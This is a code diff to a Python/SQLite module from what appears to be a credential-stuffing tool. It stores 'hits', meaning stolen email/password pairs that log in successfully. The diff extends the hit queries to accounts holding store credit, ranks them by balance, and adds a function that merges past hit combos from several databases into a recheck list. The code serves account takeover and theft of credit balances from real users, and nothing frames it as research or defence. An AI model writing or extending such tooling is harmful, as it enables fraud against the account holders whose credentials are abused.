@@ -297,7 +297,7 @@ def list_hits_for_recapture() -> list[dict[str, Any]]:
             """
             SELECT id, email, password
             FROM hits
-            WHERE member_credits > 0
+            WHERE member_credits > 0 OR store_credit_balance > 0
             ORDER BY id ASC
             """
         ).fetchall()
@@ -309,8 +309,8 @@ def list_hits() -> list[dict[str, Any]]:
         rows = conn.execute(
             """
             SELECT * FROM hits
-            WHERE member_credits > 0
-            ORDER BY member_credits DESC, created_at DESC, id DESC
+            WHERE member_credits > 0 OR store_credit_balance > 0
+            ORDER BY store_credit_balance DESC, member_credits DESC, created_at DESC, id DESC
             """
         ).fetchall()
         return [dict(row) for row in rows]
@@ -331,13 +331,16 @@ def clear_hits() -> int:
         return cur.rowcount
 
 
+HITS_RECHECK_COMBOS_PATH = DB_PATH.parent / "hits-recheck-combos.txt"
+
+
 def delete_non_vip_hits() -> int:
     """Remove credit hits verified as non-VIP (has membership_status, is_vip = 0)."""
     with connect() as conn:
         cur = conn.execute(
             """
             DELETE FROM hits
-            WHERE member_credits > 0
+            WHERE (member_credits > 0 OR store_credit_balance > 0)
               AND is_vip = 0
               AND membership_status IS NOT NULL
               AND membership_status != ''
@@ -349,3 +352,46 @@ def delete_non_vip_hits() -> int:
 
 def delete_hits_by_ids(ids: list[int]) -> int:
     return delete_hits(ids)
+
+
+def _add_recheck_combo(seen: set[str], lines: list[str], email: str, password: str) -> None:
+    email = (email or "").strip()
+    password = (password or "").strip()
+    if not email or not password or "@" not in email:
+        return
+    key = combo_key(email, password)
+    if key in seen:
+        return
+    seen.add(key)
+    lines.append(f"{email}:{password}")
+
+
+def _scan_db_for_hit_combos(db_path: Path, seen: set[str], lines: list[str]) -> None:
+    if not db_path.is_file():
+        return
+    with sqlite3.connect(db_path) as conn:
+        for email, password in conn.execute(
+            "SELECT email, password FROM checked_combos WHERE status = 'hit'"
+        ):
+            _add_recheck_combo(seen, lines, email, password)
+        for email, password in conn.execute(
+            "SELECT email, password FROM hits WHERE email IS NOT NULL AND password IS NOT NULL"
+        ):
+            _add_recheck_combo(seen, lines, email, password)
+
+
+def build_hits_recheck_combo_file(extra_db_paths: list[Path] | None = None) -> dict[str, Any]:
+    """Merge historical hit combos into data/hits-recheck-combos.txt."""
+    seen: set[str] = set()
+    lines: list[str] = []
+    _scan_db_for_hit_combos(DB_PATH, seen, lines)
+    for path in extra_db_paths or []:
+        _scan_db_for_hit_combos(path, seen, lines)
+    lines.sort(key=lambda line: line.lower())
+    HITS_RECHECK_COMBOS_PATH.parent.mkdir(parents=True, exist_ok=True)
+    HITS_RECHECK_COMBOS_PATH.write_text("\n".join(lines) + ("\n" if lines else ""), encoding="utf-8")
+    return {
+        "count": len(lines),
+        "path": str(HITS_RECHECK_COMBOS_PATH),
+        "filename": HITS_RECHECK_COMBOS_PATH.name,
+    }
